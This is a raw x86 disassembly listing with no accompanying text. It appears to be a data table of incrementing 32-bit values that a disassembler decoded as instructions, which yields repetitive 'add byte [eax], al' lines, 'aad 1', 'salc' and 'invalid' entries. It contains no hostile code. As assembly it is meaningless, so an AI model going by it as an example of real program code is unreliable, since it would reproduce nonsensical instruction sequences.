aam 1
add byte [eax], al
add byte [eax], al
add dh, ch
aam 1
add byte [eax], al
add byte [eax], al
add bh, ch
aam 1
add byte [eax], al
add byte [eax], al
add al, dh
aam 1
add byte [eax], al
add byte [eax], al
add cl, dh
aam 1
add byte [eax], al
add byte [eax], al
add dl, dh
aam 1
add byte [eax], al
add byte [eax], al
add bl, dh
aam 1
add byte [eax], al
add byte [eax], al
add ah, dh
aam 1
add byte [eax], al
add byte [eax], al
add ch, dh
aam 1
add byte [eax], al
add byte [eax], al
add dh, dh
aam 1
add byte [eax], al
add byte [eax], al
add bh, dh
aam 1
add byte [eax], al
add byte [eax], al
add al, bh
aam 1
add byte [eax], al
add byte [eax], al
add cl, bh
aam 1
add byte [eax], al
add byte [eax], al
add dl, bh
aam 1
add byte [eax], al
add byte [eax], al
add bl, bh
aam 1
add byte [eax], al
add byte [eax], al
add ah, bh
aam 1
add byte [eax], al
add byte [eax], al
add ch, bh
aam 1
add byte [eax], al
add byte [eax], al
add dh, bh
aam 1
add byte [eax], al
add byte [eax], al
add bh, bh
aam 1
add byte [eax], al
add byte [eax], al
add byte [eax], al
aad 1
add byte [eax], al
add byte [eax], al
add byte [ecx], al
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx], al
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebx], al
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx*8 + 1], al
add byte [eax], al
add eax, 0x1d5
add byte [eax], al
add byte [edi], al
aad 1
add byte [eax], al
add byte [eax], al
add byte [eax], cl
aad 1
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx], cl
aad 1
add byte [eax], al
add byte [eax], al
add byte [0x1d5], cl
add byte [eax], al
add byte [esi], cl
aad 1
add byte [eax], al
add byte [eax], al
add byte [edi], cl
aad 1
add byte [eax], al
add byte [eax], al
add byte [eax], dl
aad 1
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx], dl
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx*8 + 1], dl
add byte [eax], al
push ss
aad 1
add byte [eax], al
add byte [eax], al
add byte [edi], dl
aad 1
add byte [eax], al
add byte [eax], al
add byte [eax], bl
aad 1
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx], bl
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebx], bl
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx*8 + 1], bl
add byte [eax], al
push ds
aad 1
add byte [eax], al
add byte [eax], al
add byte [edi], bl
aad 1
add byte [eax], al
add byte [eax], al
add byte [eax], ah
aad 1
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx], ah
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebx], ah
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx*8 + 1], ah
add byte [eax], al
and eax, 0x1d5
add byte [eax], al
add byte [esi], ah
aad 1
add byte [eax], al
add byte [eax], al
add byte [edi], ah
aad 1
add byte [eax], al
add byte [eax], al
add byte [eax], ch
aad 1
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx], ch
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx*8 + 1], ch
add byte [eax], al
sub eax, 0x1d5
add byte [eax], al
add byte [esi], ch
aad 1
add byte [eax], al
add byte [eax], al
add byte [edi], ch
aad 1
add byte [eax], al
add byte [eax], al
add byte [eax], dh
aad 1
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx], dh
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebx], dh
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx*8 + 1], dh
add byte [eax], al
xor eax, 0x1d5
add byte [eax], al
add byte [esi], dh
aad 1
add byte [eax], al
add byte [eax], al
add byte [edi], dh
aad 1
add byte [eax], al
add byte [eax], al
add byte [eax], bh
aad 1
add byte [eax], al
add byte [eax], al
add byte [ecx], bh
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebx], bh
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx*8 + 1], bh
add byte [eax], al
cmp eax, 0x1d5
add byte [eax], al
add byte [esi], bh
aad 1
add byte [eax], al
add byte [eax], al
add byte [eax - 0x2b], al
add dword [eax], eax
add byte [eax], al
add byte [eax], al
inc ecx
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx - 0x2b], al
add dword [eax], eax
add byte [eax], al
add byte [eax], al
inc ebx
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebp + edx*8 + 1], al
add byte [eax], al
add byte [eax], al
add byte [esi - 0x2b], al
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec edx
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebx - 0x2b], cl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec esp
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x2b], cl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec esi
aad 1
add byte [eax], al
add byte [eax], al
add byte [edi - 0x2b], cl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push eax
aad 1
add byte [eax], al
add byte [eax], al
add byte [edx - 0x2b], dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push ebx
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebp + edx*8 + 1], dl
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x2b], dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push esi
aad 1
add byte [eax], al
add byte [eax], al
add byte [edi - 0x2b], dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop eax
aad 1
add byte [eax], al
add byte [eax], al
add byte [ecx - 0x2b], bl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop edx
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebx - 0x2b], bl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop esp
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x2b], bl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop esi
aad 1
add byte [eax], al
add byte [eax], al
add byte [edi - 0x2b], bl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pushal
aad 1
add byte [eax], al
add byte [eax], al
add byte [ecx - 0x2b], ah
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebx - 0x2b], ah
add dword [eax], eax
add byte [eax], al
add byte [eax], al
aad 1
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x2b], ah
add dword [eax], eax
add byte [eax], al
add byte [eax], al
aad 1
add byte [eax], al
add byte [eax], al
add byte [edi - 0x2b], ah
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push 0x1d5
add byte [eax], al
add byte [ecx - 0x2b], ch
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push 0xffffffffffffffd5
add dword [eax], eax
add byte [eax], al
add byte [eax], al
imul edx, ebp, 1
add byte [eax], al
add byte [eax], al
add byte [ebp + edx*8 + 1], ch
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x2b], ch
add dword [eax], eax
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
aad 1
add byte [eax], al
add byte [eax], al
add byte [edi - 0x2b], ch
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jo 0x8097a27
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jno 0x8097a2f
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jb 0x8097a37
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jae 0x8097a3f
add dword [eax], eax
add byte [eax], al
add byte [eax], al
je 0x8097a47
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jne 0x8097a4f
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jbe 0x8097a57
add dword [eax], eax
add byte [eax], al
add byte [eax], al
ja 0x8097a5f
add dword [eax], eax
add byte [eax], al
add byte [eax], al
js 0x8097a67
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jns 0x8097a6f
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jp 0x8097a77
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jnp 0x8097a7f
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jl 0x8097a87
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jge 0x8097a8f
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jle 0x8097a97
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jg 0x8097a9f
add dword [eax], eax
add byte [eax], al
add byte [eax], al
adc ch, 1
add byte [eax], al
add byte [eax], al
add byte [ecx + 0x1d5], al
add byte [eax], al
add byte [edx + 0x1d5], al
add byte [eax], al
add byte [ebx + 0x1d5], al
add byte [eax], al
add byte [ebp + edx*8 + 1], al
add byte [eax], al
test ebp, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xchg ch, dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xchg ebp, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov ch, dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov ebp, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov dl, ch
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov edx, ebp
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov ebp, ss
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
aad 1
add byte [eax], al
add byte [eax], al
add byte [esi + 0x1d5], cl
add byte [eax], al
add byte [edi + 0x1d5], cl
add byte [eax], al
add byte [eax + 0x1d5], dl
add byte [eax], al
add byte [ecx + 0x1d5], dl
add byte [eax], al
add byte [edx + 0x1d5], dl
add byte [eax], al
add byte [ebx + 0x1d5], dl
add byte [eax], al
add byte [ebp + edx*8 + 1], dl
add byte [eax], al
xchg ebp, eax
aad 1
add byte [eax], al
add byte [eax], al
add byte [esi + 0x1d5], dl
add byte [eax], al
add byte [edi + 0x1d5], dl
add byte [eax], al
add byte [eax + 0x1d5], bl
add byte [eax], al
add byte [ecx + 0x1d5], bl
add byte [eax], al
add byte [edx + 0x1d5], bl
add byte [eax], al
add byte [ebx + 0x1d5], bl
add byte [eax], al
add byte [ebp + edx*8 + 1], bl
add byte [eax], al
popfd
aad 1
add byte [eax], al
add byte [eax], al
add byte [esi + 0x1d5], bl
add byte [eax], al
add byte [edi + 0x1d5], bl
add byte [eax], al
add byte [eax + 0x1d5], ah
add byte [eax], al
add byte [ecx + 0x1d5], ah
add byte [eax], al
add byte [edx + 0x1d5], ah
add byte [eax], al
add byte [ebx + 0x1d5], ah
add byte [eax], al
add byte [ebp + edx*8 + 1], ah
add byte [eax], al
movsd dword es:[edi], dword ptr [esi]
aad 1
add byte [eax], al
add byte [eax], al
add byte [esi + 0x1d5], ah
add byte [eax], al
add byte [edi + 0x1d5], ah
add byte [eax], al
add byte [eax + 0x1d5], ch
add byte [eax], al
add byte [ecx + 0x1d5], ch
add byte [eax], al
add byte [edx + 0x1d5], ch
add byte [eax], al
add byte [ebx + 0x1d5], ch
add byte [eax], al
add byte [ebp + edx*8 + 1], ch
add byte [eax], al
lodsd eax, dword [esi]
aad 1
add byte [eax], al
add byte [eax], al
add byte [esi + 0x1d5], ch
add byte [eax], al
add byte [edi + 0x1d5], ch
add byte [eax], al
add byte [eax + 0x1d5], dh
add byte [eax], al
add byte [ecx + 0x1d5], dh
add byte [eax], al
add byte [edx + 0x1d5], dh
add byte [eax], al
add byte [ebx + 0x1d5], dh
add byte [eax], al
add byte [ebp + edx*8 + 1], dh
add byte [eax], al
mov ch, 0xd5
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov dh, 0xd5
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov bh, 0xd5
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov eax, 0x1d5
add byte [eax], al
add byte [ecx + 0x1d5], bh
add byte [eax], al
add byte [edx + 0x1d5], bh
add byte [eax], al
add byte [ebx + 0x1d5], bh
add byte [eax], al
add byte [ebp + edx*8 + 1], bh
add byte [eax], al
mov ebp, 0x1d5
add byte [eax], al
add byte [esi + 0x1d5], bh
add byte [eax], al
add byte [edi + 0x1d5], bh
add byte [eax], al
add al, al
aad 1
add byte [eax], al
add byte [eax], al
add cl, al
aad 1
add byte [eax], al
add byte [eax], al
add dl, al
aad 1
add byte [eax], al
add byte [eax], al
add bl, al
aad 1
add byte [eax], al
add byte [eax], al
add ah, al
aad 1
add byte [eax], al
add byte [eax], al
add ch, al
aad 1
add byte [eax], al
add byte [eax], al
add dh, al
aad 1
add byte [eax], al
add byte [eax], al
add bh, al
aad 1
add byte [eax], al
add byte [eax], al
add al, cl
aad 1
add byte [eax], al
add byte [eax], al
add cl, cl
aad 1
add byte [eax], al
add byte [eax], al
add dl, cl
aad 1
add byte [eax], al
add byte [eax], al
add bl, cl
aad 1
add byte [eax], al
add byte [eax], al
add ah, cl
aad 1
add byte [eax], al
add byte [eax], al
add ch, cl
aad 1
add byte [eax], al
add byte [eax], al
add dh, cl
aad 1
add byte [eax], al
add byte [eax], al
add bh, cl
aad 1
add byte [eax], al
add byte [eax], al
add al, dl
aad 1
add byte [eax], al
add byte [eax], al
add cl, dl
aad 1
add byte [eax], al
add byte [eax], al
add dl, dl
aad 1
add byte [eax], al
add byte [eax], al
add bl, dl
aad 1
add byte [eax], al
add byte [eax], al
add ah, dl
aad 1
add byte [eax], al
add byte [eax], al
add ch, dl
aad 1
add byte [eax], al
add byte [eax], al
add dh, dl
aad 1
add byte [eax], al
add byte [eax], al
add bh, dl
aad 1
add byte [eax], al
add byte [eax], al
add al, bl
aad 1
add byte [eax], al
add byte [eax], al
add cl, bl
aad 1
add byte [eax], al
add byte [eax], al
add dl, bl
aad 1
add byte [eax], al
add byte [eax], al
add bl, bl
aad 1
add byte [eax], al
add byte [eax], al
add ah, bl
aad 1
add byte [eax], al
add byte [eax], al
add ch, bl
aad 1
add byte [eax], al
add byte [eax], al
add dh, bl
aad 1
add byte [eax], al
add byte [eax], al
add bh, bl
aad 1
add byte [eax], al
add byte [eax], al
add al, ah
aad 1
add byte [eax], al
add byte [eax], al
add cl, ah
aad 1
add byte [eax], al
add byte [eax], al
add dl, ah
aad 1
add byte [eax], al
add byte [eax], al
add bl, ah
aad 1
add byte [eax], al
add byte [eax], al
add ah, ah
aad 1
add byte [eax], al
add byte [eax], al
add ch, ah
aad 1
add byte [eax], al
add byte [eax], al
add dh, ah
aad 1
add byte [eax], al
add byte [eax], al
add bh, ah
aad 1
add byte [eax], al
add byte [eax], al
add al, ch
aad 1
add byte [eax], al
add byte [eax], al
add cl, ch
aad 1
add byte [eax], al
add byte [eax], al
add dl, ch
aad 1
add byte [eax], al
add byte [eax], al
add bl, ch
aad 1
add byte [eax], al
add byte [eax], al
add ah, ch
aad 1
add byte [eax], al
add byte [eax], al
add ch, ch
aad 1
add byte [eax], al
add byte [eax], al
add dh, ch
aad 1
add byte [eax], al
add byte [eax], al
add bh, ch
aad 1
add byte [eax], al
add byte [eax], al
add al, dh
aad 1
add byte [eax], al
add byte [eax], al
add cl, dh
aad 1
add byte [eax], al
add byte [eax], al
add dl, dh
aad 1
add byte [eax], al
add byte [eax], al
add bl, dh
aad 1
add byte [eax], al
add byte [eax], al
add ah, dh
aad 1
add byte [eax], al
add byte [eax], al
add ch, dh
aad 1
add byte [eax], al
add byte [eax], al
add dh, dh
aad 1
add byte [eax], al
add byte [eax], al
add bh, dh
aad 1
add byte [eax], al
add byte [eax], al
add al, bh
aad 1
add byte [eax], al
add byte [eax], al
add cl, bh
aad 1
add byte [eax], al
add byte [eax], al
add dl, bh
aad 1
add byte [eax], al
add byte [eax], al
add bl, bh
aad 1
add byte [eax], al
add byte [eax], al
add ah, bh
aad 1
add byte [eax], al
add byte [eax], al
add ch, bh
aad 1
add byte [eax], al
add byte [eax], al
add dh, bh
aad 1
add byte [eax], al
add byte [eax], al
add bh, bh
aad 1
add byte [eax], al
add byte [eax], al
add byte [eax], al
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add esi, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add dl, dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add edx, esi
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add al, 0xd6
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add eax, 0x1d6
add byte [eax], al
add byte [esi], al
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop es
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
or dh, dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
or esi, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
or dl, dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
or edx, esi
add dword [eax], eax
add byte [eax], al
add byte [eax], al
or al, 0xd6
add dword [eax], eax
add byte [eax], al
add byte [eax], al
or eax, 0x1d6
add byte [eax], al
add byte [esi], cl
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
adc dh, dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
adc esi, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
adc dl, dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
adc edx, esi
add dword [eax], eax
add byte [eax], al
add byte [eax], al
adc al, 0xd6
add dword [eax], eax
add byte [eax], al
add byte [eax], al
adc eax, 0x1d6
add byte [eax], al
add byte [esi], dl
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop ss
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sbb dh, dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sbb esi, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sbb dl, dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sbb edx, esi
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sbb al, 0xd6
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sbb eax, 0x1d6
add byte [eax], al
add byte [esi], bl
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop ds
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
and dh, dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
and esi, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
and dl, dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
and edx, esi
add dword [eax], eax
add byte [eax], al
add byte [eax], al
and al, 0xd6
add dword [eax], eax
add byte [eax], al
add byte [eax], al
and eax, 0x1d6
add byte [eax], al
add byte [esi], ah
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
daa
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sub dh, dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sub esi, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sub dl, dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sub edx, esi
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sub al, 0xd6
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sub eax, 0x1d6
add byte [eax], al
add byte [esi], ch
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
das
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xor dh, dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xor esi, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xor dl, dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xor edx, esi
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xor al, 0xd6
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xor eax, 0x1d6
add byte [eax], al
add byte [esi], dh
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
aaa
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
cmp dh, dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
cmp esi, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
cmp dl, dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
cmp edx, esi
add dword [eax], eax
add byte [eax], al
add byte [eax], al
cmp al, 0xd6
add dword [eax], eax
add byte [eax], al
add byte [eax], al
cmp eax, 0x1d6
add byte [eax], al
add byte [esi], bh
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
aas
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
inc eax
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
inc ecx
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
inc edx
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
inc ebx
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
inc esp
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
inc ebp
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
inc esi
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
inc edi
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec eax
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec ecx
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec edx
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec ebx
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec esp
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec ebp
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec esi
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
dec edi
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push eax
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push ecx
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push edx
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push ebx
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push esp
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push ebp
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push esi
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push edi
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop eax
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop ecx
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop edx
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop ebx
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop esp
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop ebp
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop esi
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pop edi
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
pushal
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
popal
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
arpl si, dx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push 0x1d6
add byte [eax], al
add byte [ecx - 0x2a], ch
add dword [eax], eax
add byte [eax], al
add byte [eax], al
push 0xffffffffffffffd6
add dword [eax], eax
add byte [eax], al
add byte [eax], al
imul edx, esi, 1
add byte [eax], al
add byte [eax], al
add byte [esi + edx*8 + 1], ch
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x2a], ch
add dword [eax], eax
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
outsd dx, dword [esi]
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jo 0x8098228
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jno 0x8098230
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jb 0x8098238
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jae 0x8098240
add dword [eax], eax
add byte [eax], al
add byte [eax], al
je 0x8098248
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jne 0x8098250
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jbe 0x8098258
add dword [eax], eax
add byte [eax], al
add byte [eax], al
ja 0x8098260
add dword [eax], eax
add byte [eax], al
add byte [eax], al
js 0x8098268
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jns 0x8098270
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jp 0x8098278
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jnp 0x8098280
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jl 0x8098288
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jge 0x8098290
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jle 0x8098298
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jg 0x80982a0
add dword [eax], eax
add byte [eax], al
add byte [eax], al
adc dh, 1
add byte [eax], al
add byte [eax], al
add byte [ecx + 0x1d6], al
add byte [eax], al
add byte [edx + 0x1d6], al
add byte [eax], al
add byte [ebx + 0x1d6], al
add byte [eax], al
add byte [esi + edx*8 + 1], al
add byte [eax], al
test esi, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xchg dh, dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xchg esi, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov dh, dl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov esi, edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov dl, dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov edx, esi
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov esi, ss
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov ss, esi
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
nop
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xchg ecx, eax
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xchg edx, eax
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xchg ebx, eax
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xchg esp, eax
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xchg ebp, eax
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xchg esi, eax
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xchg edi, eax
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
cwde
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
cdq
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
lcall 0, 0x1d6
add byte [ebx + 0x1d6], bl
add byte [eax], al
add byte [esi + edx*8 + 1], bl
add byte [eax], al
popfd
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
sahf
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
lahf
salc
add dword [eax], eax
add byte [eax], al
add byte [eax], al
mov al, byte [0x1d6]
add byte [eax], al
add byte [ecx + 0x1d6], ah
add byte [eax], al
add byte [edx + 0x1d6], ah
add byte [eax], al
add byte [ebx + 0x1d6], ah
add byte [eax], al
add dh, cl
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
iretd
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
rcl bh, 1
add dword [eax], eax
add byte [eax], al
add byte [eax], al
rcl edi, 1
add dword [eax], eax
add byte [eax], al
add byte [eax], al
rcl bh, cl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
rcl edi, cl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
aam 0xd7
add dword [eax], eax
add byte [eax], al
add byte [eax], al
aad 0xd7
add dword [eax], eax
add byte [eax], al
add byte [eax], al
salc
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
xlatb
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
fcom st(7)
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
fcmovbe st(0), st(7)
add dword [eax], eax
add byte [eax], al
add byte [eax], al
fcmovnbe st(0), st(7)
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
fst st(7)
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
invalid
xlatb
add dword [eax], eax
add byte [eax], al
add byte [eax], al
loopne 0x8098459
add dword [eax], eax
add byte [eax], al
add byte [eax], al
loope 0x8098461
add dword [eax], eax
add byte [eax], al
add byte [eax], al
loop 0x8098469
add dword [eax], eax
add byte [eax], al
add byte [eax], al
jecxz 0x8098471
add dword [eax], eax
add byte [eax], al
add byte [eax], al
in al, 0xd7
add dword [eax], eax
add byte [eax], al
add byte [eax], al
in eax, 0xd7
add dword [eax], eax
add byte [eax], al
add byte [eax], al
out 0xd7, al
add dword [eax], eax
add byte [eax], al
add byte [eax], al
out 0xd7, eax
add dword [eax], eax
add byte [eax], al
add byte [eax], al
call fcn.0809869c
add byte [eax], al
add cl, ch
xlatb
add dword [eax], eax
